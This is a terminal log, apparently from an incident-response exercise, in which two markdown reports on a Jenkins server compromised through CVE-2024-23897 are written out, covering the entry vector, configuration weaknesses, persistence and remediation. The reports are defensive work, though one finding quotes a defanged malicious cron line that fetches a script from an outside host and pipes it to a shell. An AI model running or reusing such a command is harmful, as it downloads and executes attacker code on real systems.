[?2004l[?2004hroot@a823ac33b777:/app# cat << 'EOF' > /app/vuln-report.md
[?2004l[?2004h> # Vulnerability Report ‚Äî Entry Analysis (CVE-2024-23897)
[?2004l[?2004h> 
[?2004l[?2004h> ## 1. Overview & Entry Vector Identification
[?2004l[?2004h> 
[?2004l[?2004h> Forensic investigation confirms that initial entry into `jenkins-prod-01` occurred via the exploitation of **CVE-2024-23897** (`/sas/cti/advisory.txt:16`, `/sas/vulns.json:4`). 
[?2004l[?2004h> 
[?2004l[?2004h> - **Target Software**: Jenkins Automation Server (Controller)
[?2004l[?2004h> - **Vulnerability Identifier**: CVE-2024-23897 (`/sas/vulns.json:4`)
[?2004l[?2004h> - **CVSS Score**: 9.8 (CRITICAL) (v3.1 vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) (`/sas/cti/advisory.txt:16`)
[?2004l[?2004h> - **CWE Classification**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory / Path Traversal), CWE-27 (`/sas/cti/advisory.txt:16`)
[?2004l[?2004h> - **Exploitation Context**: Unauthenticated Remote Code Execution (RCE) via Jenkins CLI command parser (`/sas/cti/advisory.txt:17`).
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## 2. Technical Vulnerability Analysis
[?2004l[?2004h> 
[?2004l[?2004h> ### Vulnerability Mechanism
[?2004l[?2004h> Jenkins CLI uses `args4j` library to parse command-line options. By default in affected versions (Jenkins 2.441 and earlier, LTS 2.426.2 and earlier), `args4j` features automatic expansion of `@` arguments: any argument prefixed with `@` is replaced by the contents of the file located at the specified file path (`/sas/cti/advisory.txt:17`).
[?2004l[?2004h> 
[?2004l[?2004h> When combined with CLI commands that process arbitrary files or deserialization gadgets, unauthenticated remote attackers can read internal files or trigger deserialization leading to arbitrary code execution (`/disk/var/lib/jenkins/jobs/.tmp/config.xml:3`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Host Exploitation Evidence
[?2004l[?2004h> - Evidence on disk confirms an `@type` deserialization gadget payload artifact was staged under `/disk/var/lib/jenkins/jobs/.tmp/config.xml:3` (`/sas/alerts.json:2`).
[?2004l[?2004h> - The vulnerability feed explicitly tagged this file as the primary RCE artifact (`/sas/vulns.json:4`).
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## 3. Contributing Configuration Vulnerabilities
[?2004l[?2004h> 
[?2004l[?2004h> Exploitation was directly facilitated by host configuration weakness:
[?2004l[?2004h> - Security Realm Disabled: `/disk/var/lib/jenkins/config.xml:3` specifies `<useSecurity>false</useSecurity>` (`/sas/baseline.json:2`).
[?2004l[?2004h> - Disabling security allowed anonymous users full administrative permissions over the Jenkins CLI interface without credential challenges.
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## 4. Reconciling Incorrect Vulnerability Claims (BlueKeep Disproof)
[?2004l[?2004h> 
[?2004l[?2004h> Previous shift documentation (`/sas/handoff/change-ticket.md:1`) erroneously flagged **CVE-2019-0708 (BlueKeep)** as the entry vector.
[?2004l[?2004h> 
[?2004l[?2004h> - **Disproof**: BlueKeep is a Remote Desktop Services (RDP) vulnerability affecting Windows operating systems. The host under investigation is an Ubuntu 22.04 LTS Linux server (`/disk/etc/os-release`). RDP service is not installed or exposed.
[?2004l[?2004h> - **Conclusion**: CVE-2019-0708 is entirely non-applicable to this environment. The entry vector is definitively CVE-2024-23897 (`/sas/cti/advisory.txt:16`, `/sas/vulns.json:4`).
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## 5. Remediation Vulnerability Impact & Patches
[?2004l[?2004h> 
[?2004l[?2004h> - **Upgrade Path**: Upgrade Jenkins controller to version 2.442 or LTS version 2.426.3 or higher, where `args4j` `@` expansion is disabled (`/sas/cti/advisory.txt:18`).
[?2004l[?2004h> - **Workaround / Mitigation**: Disable Jenkins CLI feature if immediate upgrade cannot be performed, and enforce security realm controls (`useSecurity=true`) in `/disk/var/lib/jenkins/config.xml:3` (`/sas/baseline.json:2`).
[?2004l[?2004h> EOF
[?2004l[?2004hroot@a823ac33b777:/app# cat << 'EOF' > /app/baseline-report.md
[?2004l[?2004h> # Baseline & Configuration Report ‚Äî Security Weaknesses Analysis
[?2004l[?2004h> 
[?2004l[?2004h> ## 1. Executive Baseline Assessment
[?2004l[?2004h> 
[?2004l[?2004h> Security baseline evaluation of `jenkins-prod-01` (`/sas/baseline.json:2`) revealed critical configuration weaknesses that directly enabled initial exploitation and facilitated persistence. The primary baseline failure is the complete disabling of Jenkins application security (`useSecurity=false`) (`/disk/var/lib/jenkins/config.xml:3`).
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## 2. Identified Baseline & Configuration Weaknesses
[?2004l[?2004h> 
[?2004l[?2004h> ### Finding BAS-01: Jenkins Security Realm Disabled (`useSecurity=false`)
[?2004l[?2004h> - **Baseline Rule ID**: CHK-06 (`/sas/baseline.json:2`)
[?2004l[?2004h> - **Configuration Path**: `/disk/var/lib/jenkins/config.xml:3` (`/sas/alerts.json:26`)
[?2004l[?2004h> - **Evidence**: `<useSecurity>false</useSecurity>`
[?2004l[?2004h> - **Impact**: Operating Jenkins with `useSecurity=false` completely turns off authentication and authorization controls. Any network endpoint capable of reaching the Jenkins HTTP or CLI port is implicitly granted full administrative privileges (`/disk/var/lib/jenkins/config.xml:3`). This allowed unauthenticated CLI commands and RCE exploitation via CVE-2024-23897 without requiring valid user credentials.
[?2004l[?2004h> - **Remediation Benchmark**: Enforce `<useSecurity>true</useSecurity>` in `/disk/var/lib/jenkins/config.xml:3`, integrate central authentication (e.g. LDAP/OIDC), and apply Matrix-based Authorization Strategy.
[?2004l[?2004h> 
[?2004l[?2004h> ### Finding BAS-02: Unrestricted SSH Authorized Keys Permissions & Governance
[?2004l[?2004h> - **Configuration Path**: `/disk/var/lib/jenkins/.ssh/authorized_keys:2`
[?2004l[?2004h> - **Evidence**: Injected unauthorized public key string (`attacker ssh-ed25519 / ssh-rsa key added to authorized_keys`) stored in `jenkins` home directory (`/disk/var/lib/jenkins/.ssh/authorized_keys:2`).
[?2004l[?2004h> - **Impact**: Lack of strict file integrity monitoring (FIM) or automated key governance permitted silent persistence via SSH key injection (`/disk/var/lib/jenkins/.ssh/authorized_keys:2`).
[?2004l[?2004h> - **Remediation Benchmark**: Implement automated authorized_keys auditing, enforce central SSH Certificate Authorities (CA), and restrict SSH login capabilities for service accounts like `jenkins`.
[?2004l[?2004h> 
[?2004l[?2004h> ### Finding BAS-03: Cron Job Storage Isolation & Execution Rights
[?2004l[?2004h> - **Configuration Path**: `/disk/var/spool/cron/crontabs/jenkins:5`
[?2004l[?2004h> - **Evidence**: User crontab file containing active malicious command: `* * * * * root <defanged beacon: curl hxxp://198.51.100.98/x | sh>` (`/disk/var/spool/cron/crontabs/jenkins:5`).
[?2004l[?2004h> - **Impact**: Permissive cron access allowed low-privilege script execution to establish recurring network egress calls and re-infect the host (`/disk/var/spool/cron/crontabs/jenkins:5`).
[?2004l[?2004h> - **Remediation Benchmark**: Restrict `/etc/cron.allow` and `/etc/cron.deny` to authorized system administrators only, and enable EDR cron monitoring alerts.
[?2004l[?2004h> 
[?2004l[?2004h> ### Finding BAS-04: Automated Groovy Initialization Script Execution
[?2004l[?2004h> - **Configuration Path**: `/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`
[?2004l[?2004h> - **Evidence**: Arbitrary `.groovy` script dropped in `/var/lib/jenkins/init.groovy.d/` (`/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`).
[?2004l[?2004h> - **Impact**: Jenkins automatically executes all Groovy scripts in `init.groovy.d/` at startup with system-level permissions. Without directory write-protection and FIM alerts, attackers leverage this feature for silent, persistent reverse shell execution (`/disk/var/lib/jenkins/init.groovy.d/z-backdoor.groovy:3`).
[?2004l[?2004h> - **Remediation Benchmark**: Restrict directory write access on `/var/lib/jenkins/init.groovy.d/` to root-only, enforce FIM alerts on new `.groovy` files, and audit startup hooks regularly.
[?2004l[?2004h> 
[?2004l[?2004h> ---
[?2004l[?2004h> 
[?2004l[?2004h> ## 3. Legitimate Baseline Configuration Verification
[?2004l[?2004h> 
[?2004l[?2004h> - **Configuration Path**: `/disk/var/lib/jenkins/init.groovy.d/logging.groovy:1`
[?2004l[?2004h> - **Verification**: Reviewed `/disk/var/lib/jenkins/init.groovy.d/logging.groovy:1`. Confirmed as an approved operational logging/maintenance script running `/usr/local/bin/backup.sh --remote 10.10.71` (`/disk/var/lib/jenkins/init.groovy.d/logging.groovy:1`). This entry complies with legitimate operations baseline.
[?2004l[?2004h> EOF
